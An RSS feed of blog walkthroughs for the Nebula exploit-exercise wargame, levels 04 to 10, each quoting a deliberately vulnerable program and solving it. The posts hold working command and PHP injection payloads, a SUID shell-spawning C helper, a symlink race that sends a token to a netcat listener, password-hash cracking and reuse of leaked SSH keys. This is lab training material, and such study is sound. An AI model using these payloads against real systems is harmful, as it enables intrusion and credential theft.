<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Nebula on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/nebula/index.xml</link>
    <description>Recent content in Nebula on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/nebula/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploit Exercises - Nebula 10</title>
      <link>https://www.mattandreko.com/2011/12/11/exploit-exercises---nebula-10/</link>
      <pubDate>Sun, 11 Dec 2011 07:48:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/11/exploit-exercises---nebula-10/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/nebula/level10&#34;&gt;Challenge 10&lt;/a&gt; is another nostalgic one for me. Back when I was first starting with linux, I remember reading about overflows and race conditions.  This challenge is the latter, a race condition.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We&amp;rsquo;re given a C/C++ app to exploit:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
 char *file;
 char *host;

 if(argc &amp;lt; 3) {
  printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
  exit(1);
 }

 file = argv[1];
 host = argv[2];

 if(access(argv[1], R_OK) == 0) {
  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];

  printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

  fd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);

  if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
   printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
   exit(EXIT_FAILURE);
  }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
   printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
   exit(EXIT_FAILURE);
  }
#undef HITHERE

  printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
   printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
   exit(EXIT_FAILURE);
  }

  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
   printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
   exit(EXIT_FAILURE);
  }

  write(fd, buffer, rc);

  printf(&amp;quot;wrote file!\n&amp;quot;);

 } else {
  printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
 }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The problem with this code, is that it first checks to see if the user running the problem has access to the file (on line 24).  It then assumes for the rest of the execution of the program, that we &lt;em&gt;still&lt;/em&gt; have access to it.  The point of this exercise is to trick the program by switching out the file while the program is running.  Hence a race condition.&lt;/p&gt;

&lt;p&gt;To set this one up, I used 2 machines, my Nebula machine, and another VM running &lt;a href=&#34;http://www.backtrack-linux.org&#34;&gt;BackTrack Linux&lt;/a&gt;.  Any Linux should do, I just had this one handy.  The only requirement is &lt;a href=&#34;http://nc110.sourceforge.net&#34;&gt;NetCat&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;On the BackTrack machine (10.1.1.132 for me), I ran 2 terminals.  The first contained:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# while :; do nc -l -p 18211 &amp;gt;&amp;gt; out.txt; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The second contained:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# tail -f out.txt | grep -v &amp;quot;.oO Oo.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran both of these so that the first one would continuously open up a listening socket connection on port 18211 (per the vulnerable program), and append all information received to &amp;ldquo;out.txt&amp;rdquo;.  The second command would continuously watch out.txt and output any lines that didn&amp;rsquo;t have the little banner the vulnerable program uses.  That way I didn&amp;rsquo;t get spammed with trash I didn&amp;rsquo;t care about.&lt;/p&gt;

&lt;p&gt;Now on the Nebula machine, I ran 2 more terminals.  In the first, I ran:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level10@nebula:~$ while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the second:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level10@nebula:~$ while :; do nice -n 20 ./flag10 /tmp/token10 10.1.1.132; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;These commands are pretty simple to pick apart.  They both are endless loops, just like the earlier NetCat session.  The first would create a symbolic link to /tmp/token10.  However, it would alternate between using /tmp/token (a blank file I made), and /home/flag10/token.  The idea is to try using /tmp/token when the access() is called in the vulnerable program, but then have /home/flag10/token be there when we actually send the file.  It&amp;rsquo;s unreliable, but will eventually work.  The second command runs the vulnerable program, passing it the symlinked file and the BackTrack IP.  I used &lt;a href=&#34;http://linux.about.com/library/cmd/blcmdl1_nice.htm&#34;&gt;nice&lt;/a&gt;, to lower the priority as low as possible, so that hopefully the symlinking loop would operate faster.&lt;/p&gt;

&lt;p&gt;When you have all of these terminals running, it&amp;rsquo;s just a matter of time before you get the token sent to you.  Some iterations of flag10 will fail, some will succeed.  Just watch the second terminal on the BackTrack machine, and eventually you&amp;rsquo;ll see the token come over.  You should see this flying across the screen:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;615a2ce1-b2b5-4c76-8eed-8aa5c4015c27&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Just stop all the terminals, and you should be done with this challenge.  I did learn quite a bit on this one, as it was honestly my first race condition I&amp;rsquo;d ever had to exploit.  My original methodology was to use &lt;a href=&#34;http://www.gnu.org/s/gdb/&#34;&gt;GDB&lt;/a&gt; to start the program, and set a breakpoint after the initial access() was done.  Then switch the file manually, and resume.  This worked brilliantly, however I learned that when dealing with SUID programs, you can&amp;rsquo;t use GDB on them, unless you run GDB as root.  This is a security design of Linux.  So instead, I had to go with the quirky commands.  I&amp;rsquo;m still interested in seeing if it could be done with a custom C++ app which would invoke flag10, and attach to the process using ptrace to duplicate my GDB idea.  I just don&amp;rsquo;t know if it&amp;rsquo;ll work or not.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 09</title>
      <link>https://www.mattandreko.com/2011/12/10/exploit-exercises---nebula-09/</link>
      <pubDate>Sat, 10 Dec 2011 05:46:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/10/exploit-exercises---nebula-09/</guid>
      <description>&lt;p&gt;Challenge 09 gave me the most issues out of any other challenge so far.  This may just be because I haven&amp;rsquo;t touched PHP since version 3 was just coming out.  However, it is based on a dangerous function, known as &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace()&lt;/a&gt;.  There are several more dangerous functions, some of which can be seen &lt;a href=&#34;http://stackoverflow.com/questions/3115559/exploitable-php-functions&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The challenge starts by giving us the source code of the program we will be exploiting.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I noticed immediately, was that the program accepted 2 arguments, but never used the second one, other than to pass it into the &amp;ldquo;markup&amp;rdquo; function as &amp;ldquo;$use_me&amp;rdquo;.  This seemed odd, so I figured it had to do something with that.  I also thought at first that the &amp;ldquo;spam&amp;rdquo; function was never being called, but then noticed it in quotes on the first line of &amp;ldquo;preg_replace&amp;rdquo; statements.  I had to look this function up, and find out that it would evaluate the code at run-time.  This means that I needed to inject code into that call to &amp;ldquo;spam()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;I tried doing some basic injection to try to get something equivelent to it calling:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spam(&amp;quot;&amp;quot;);system(&amp;quot;/bin/bash&amp;quot;);print(&amp;quot;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However this never worked, because of the &lt;a href=&#34;http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;PCRE modifiers&lt;/a&gt; built into PHP.  They automatically will escape single and double quotes, as well as backticks (at least according to the docs).  I spent &lt;b&gt;hours&lt;/b&gt; trying to inject various strings to get some sort of code execution.&lt;/p&gt;

&lt;p&gt;Somewhere along the line, I read a page (sorry I can&amp;rsquo;t seem to find it again) where they mentioned using an alternative syntax to the backreferences in preg_replace.  So instead of using \2, you could use ${2}.  This is covered slightly on the &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace&lt;/a&gt; php function reference.  What that reference doesn&amp;rsquo;t show, is that you can apparently have that not just reference parameters, but any variable in the code.  After tinkering a while, I settled on a pattern.  I created a file named, /tmp/level09.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${`$use_me`}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Firstly, I had to start with &amp;ldquo;[email &amp;ldquo; and end with &amp;ldquo;]&amp;rdquo; to get it into this regex at all.  Because of the PCRE modifiers, I used back-ticks, because in researching them, I ran across a &lt;a href=&#34;http://www.madirish.net/node/437&#34;&gt;blog post&lt;/a&gt; saying that back-ticks were able to bypass them somehow.  So with variable expansion, and the PCRE modifier bypass, this should let me inject some code into the function.&lt;/p&gt;

&lt;p&gt;Because running a &amp;ldquo;system()&amp;rdquo; or &amp;ldquo;exec()&amp;rdquo; method in the php caused me problems with interactivity, I opted to use commands that required no interaction at run-time.  I again used my /tmp/bash_id.c file from challenge 07:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main(int argc, char *argv[])
{
    if (argc != 2)
        printf(&amp;quot;usage: %s &amp;lt;user id&amp;gt;\n&amp;quot;, argv[0]);
    else {
        int i = atoi(argv[1]);
        setresuid(i, i, i);
        setresgid(i, i, i);
        system( &amp;quot;/bin/bash&amp;quot; );
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then would call the compiled SUID version of the php file with 2 parameters.  The first would be the text file I wanted to parse, and the second would be the commands I wanted to run, which would get inserted into the $use_me variable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/level09.txt &amp;quot;gcc -o /home/flag09/bash_id /tmp/bash_id.c;chmod +s,a+rwx /home/flag09/bash_id&amp;quot;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This compiled my bash_id.c source file to the flag09 user&amp;rsquo;s home directory, and marked it SUID.  I ignored the PHP Notice, since I knew I was tinkering.&lt;/p&gt;

&lt;p&gt;After making sure the bash_id program did get created properly, I just needed to call it with the userid of flag09 as the first parameter.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./bash_id `cat /etc/passwd | grep flag09 | cut -d : -f 3`
flag09@nebula:/home/flag09$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This apparently worked, so I ran the &amp;ldquo;getflag&amp;rdquo; command as usual, marking completion of this challenge.  This was by far the most guessing I&amp;rsquo;ve had to do on any of the challenges so far.  I really hope that I don&amp;rsquo;t get stuck soon, leaving me unable to continue on.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 08</title>
      <link>https://www.mattandreko.com/2011/12/09/exploit-exercises---nebula-08/</link>
      <pubDate>Fri, 09 Dec 2011 05:38:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/09/exploit-exercises---nebula-08/</guid>
      <description>&lt;p&gt;Challenge 08 is more of a real-world challenge than some of the others have been.  It&amp;rsquo;s also very dear to my heart, getting back to my networking roots.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;You are instructed simply to check out what the level08 user has been up to.  This is fairly easy, since when you login as level08, you see a &amp;ldquo;capture.pcap&amp;rdquo; file in their home folder.  A pcap file is a standard packet capture file format.  More details can be found &lt;a href=&#34;http://en.wikipedia.org/wiki/Pcap&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you open this file in &lt;a href=&#34;http://www.wireshark.org&#34;&gt;WireShark&lt;/a&gt;, a popular network monitoring program, you can see that a tcp stream was recorded.  You can also see the plain-text &amp;ldquo;conversation&amp;rdquo; between both hosts, by right-clicking on one of the packets, and clicking, &amp;ldquo;Follow TCP Stream&amp;rdquo;.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/level08_tcp_stream.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;For a while, I thought this was the end of this problem, however it bugged me a bit, that the challenge instructions said, &amp;ldquo;and use it to log into flag08 account&amp;rdquo;.  So I went digging some more.&lt;/p&gt;

&lt;p&gt;I decided that since I could not login to flag08 as &amp;ldquo;backdoor&amp;hellip;00Rm8.ate&amp;rdquo;, I would re-analyze the file.  I this time, looked at it in hex, and saw that the periods were actually a representation of the 0x7f digit:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/level08_tcp_stream_hex.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Now I&amp;rsquo;m familiar with a lot of hex digits without having to look them up, since I tinker with exploit development, and have been coding random languages for 15 years or so.  However, I had not remembered ever seeing 0x7f.  I looked it up on an &lt;a href=&#34;http://web.cs.mun.ca/~michael/c/ascii-table.html&#34;&gt;ASCII table&lt;/a&gt; and found that it was actually the key code for &amp;ldquo;Delete&amp;rdquo;.  So it looks like the flag08 user had some issues remembering their password, and had to delete some of the typed keys and re-type them. If you pretend to type the password from the &amp;ldquo;capture.pcap&amp;rdquo; file, including the delete keys (use backspace), you end up with the password of &amp;ldquo;backd00Rmate&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;To test this, we can simply use su.  Once it works, run &amp;ldquo;getflag&amp;rdquo; to complete the challenge.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level08@nebula:/home/flag08$ su flag08
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 07</title>
      <link>https://www.mattandreko.com/2011/12/08/exploit-exercises---nebula-07/</link>
      <pubDate>Thu, 08 Dec 2011 06:10:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/08/exploit-exercises---nebula-07/</guid>
      <description>&lt;p&gt;This &lt;a href=&#34;http://exploit-exercises.com/nebula/level07&#34;&gt;next challenge&lt;/a&gt; is a little bit more tricky than some of the previous ones.  There&amp;rsquo;s a lot more code involved, but it&amp;rsquo;s not too bad.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the flag07 home directory, you&amp;rsquo;ll find the configuration for a simple http server, thttpd.conf.  Inside, you&amp;rsquo;ll find that it&amp;rsquo;s running an HTTP server on port 7007 as the flag07 user.  This is where the perl script that is provided comes in.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
 $host = $_[0];

 print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

 @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
 foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

 print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);  }  # check if Host set. if not, display normal page, etc  

 ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can now browse to this script by going to http://&lt;nolink&gt;10.1.1.16:7007/index.cgi (assuming your Nebula VM is running on 10.1.1.16).  Unfortunately, since no parameters are being passed, it presents us with the usage of ping.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The perl script takes a parameter named &amp;ldquo;Host&amp;rdquo;, and pipes it into the ping command.  Because of how poorly the perl script was written, we can inject more commands in there.  To make it easy, I made a quick HTML document to assist, so I didn&amp;rsquo;t have to do the encoding of spaces and symbols.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; &amp;lt;body&amp;gt;
  &amp;lt;form action=&amp;quot;http://10.1.1.6:7007/index.cgi&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt;
   &amp;lt;input name=&amp;quot;Host&amp;quot; id=&amp;quot;Host&amp;quot; type=&amp;quot;text&amp;quot; /&amp;gt;
   &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;
  &amp;lt;/form&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I can open that html file in my browser of choice, and when I submit, it&amp;rsquo;ll automatically do all the encoding for me, so I can just worry about the injection.&lt;/p&gt;

&lt;p&gt;In addition to the html page, I also modified my level03.c from a prior post, to make it more generic.  I saved this file as /tmp/bash_id.c:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main(int argc, char *argv[]){
    if (argc != 2)
        printf(&amp;quot;usage: %s &amp;lt;user id&amp;gt;\n&amp;quot;, argv[0]);
    else {
        int i = atoi(argv[1]);
        setresuid(i, i, i);
        setresgid(i, i, i);
        system( &amp;quot;/bin/bash&amp;quot; );
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This modified source file now takes a parameter of the user id you want to impersonate.  I want to impersonate the flag07 user, so I checked out the /etc/passwd file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/tmp$ cat /etc/passwd | grep flag07
flag07:x:992:992::/home/flag07:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I know that flag07 is also user 992.&lt;/p&gt;

&lt;p&gt;I opened the html file that I made, and in the textbox typed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;;gcc -o level07 /tmp/bash_id.c;chmod +s,a+wrx level07
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I clicked the submit button, it sent the final command of:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ping -c 3 ;gcc -o level07 /tmp/bash_id.c;chmod +s,a+wrx level07 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It makes the ping program have incorrect usage, thus ending quickly.  It then compiles my newly written bash_id.c script, and places the executable in the /home/flag07 folder, and marks it executable and SUID.  From here, it was just as simple as executing that program with the 992 parameter, and running &amp;ldquo;getflag&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/home/flag07$ ./level07 992
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 06</title>
      <link>https://www.mattandreko.com/2011/12/07/exploit-exercises---nebula-06/</link>
      <pubDate>Wed, 07 Dec 2011 06:10:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/07/exploit-exercises---nebula-06/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/nebula/level06&#34;&gt;Nebula 06&lt;/a&gt; is a retro challenge. The description of the problem says &amp;ldquo;The flag06 account credentials came from a legacy unix system.&amp;rdquo; This instantly made me think to check out the password file, /etc/passwd. Back in &amp;ldquo;the old days&amp;rdquo;, unix systems stored their passwords in /etc/passwd. But due to having the passwords where everyone could see them, they ended up moving towards password shadowing, where they stored the actual passwords in /etc/shadow, but kept the same user data in /etc/passwd.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the /etc/passwd file I found a snippet for the flag06 user, with the old-fashioned password encrypted:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To crack this, I went to my trusty &lt;a href=&#34;http://www.backtrack-linux.org&#34;&gt;BackTrack&lt;/a&gt; virtual machine, and ran &lt;a href=&#34;http://www.openwall.com/john&#34;&gt;John The Ripper&lt;/a&gt; against it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/passwords/john# echo &#39;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh&#39; &amp;gt; /root/flag06
root@bt:/pentest/passwords/john# ./john /root/flag06 
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (flag06)
guesses: 1  time: 0:00:00:00 100.00% (2) (ETA: Fri Dec  2 09:51:10 2011)  c/s: 7530  trying: 12345 - biteme
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks go john, I now know the flag06 password is &amp;ldquo;hello&amp;rdquo;.  So I ssh locally, and run &amp;ldquo;getflag&amp;rdquo; to complete the challenge.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level06@nebula:/home/flag06$ ssh flag06@localhost

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


flag06@localhost&#39;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Fri Dec  2 06:51:34 2011 from localhost
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it.  Level 06 complete, with a warm and fuzzy look back in history.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 05</title>
      <link>https://www.mattandreko.com/2011/12/06/exploit-exercises---nebula-05/</link>
      <pubDate>Tue, 06 Dec 2011 05:24:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/06/exploit-exercises---nebula-05/</guid>
      <description>&lt;p&gt;So going forward to the &lt;a href=&#34;http://exploit-exercises.com/nebula/level05&#34;&gt;Nebula 05&lt;/a&gt;, we now have to find some sort of weak permissions somewhere to escalate from level05 to flag05.  In searching through the flag05 home directory, I saw a &amp;ldquo;.backup&amp;rdquo; folder containing a copy of the user&amp;rsquo;s old ssh keys. I extracted the archive to the level05 user&amp;rsquo;s directory, so they could be used.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;level05@nebula:/home/flag05$ cd .backup
level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz -C /home/level05
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once that was setup, I simply tried to SSH back to the local machine but using the flag05 user, since I had their authentication keys.  Luckily it was secured &lt;em&gt;only&lt;/em&gt; with keys, and not a password as well.  This let me right in.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level05@nebula:/home/flag05/.backup$ ssh flag05@localhost
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;localhost&#39; (ECDSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

* Documentation:  https://help.ubuntu.com/
Last login: Fri Dec  2 04:36:54 2011 from localhost
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
flag05@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After getting in, I ran the &amp;ldquo;getflag&amp;rdquo; command, in case it does store the results somewhere.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 04</title>
      <link>https://www.mattandreko.com/2011/12/05/exploit-exercises---nebula-04/</link>
      <pubDate>Mon, 05 Dec 2011 05:45:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/05/exploit-exercises---nebula-04/</guid>
      <description>&lt;p&gt;I really like &lt;a href=&#34;http://exploit-exercises.com/nebula/level04&#34;&gt;Nebula 04&lt;/a&gt;, because it is really easy, but still a commonly missed thing in programming.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The object of this challenge is to find a vulnerability and exploit this C++ program.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
 char buf[1024];
 int fd, rc;

 if(argc == 1) {
  printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
  exit(EXIT_FAILURE);
 }

 if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
  printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
  exit(EXIT_FAILURE);
 }

 fd = open(argv[1], O_RDONLY);
 if(fd == -1) {
  err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
 }

 rc = read(fd, buf, sizeof(buf));

 if(rc == -1) {
  err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
 }

 write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this program first verifies that you did pass it an argument of some sort. If you pass that check, it then makes sure that your argument does not contain the term &amp;ldquo;token&amp;rdquo;, since the developer knows the filename they want to protect. If both of those suceed, it tries to open the file, and print it to the screen, as long as it exists, and has no general read errors.&lt;/p&gt;

&lt;p&gt;So to exploit this program, we need to pass the program an argument, and it needs to not contain the term &amp;ldquo;token&amp;rdquo; in it. So all we need to do is make a symbolic link.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04
level04@nebula:/home/flag04$ ./flag04 /tmp/level04
06508b5e-8909-4f38-b630-fdb148a848a2
&lt;/code&gt;&lt;/pre&gt;

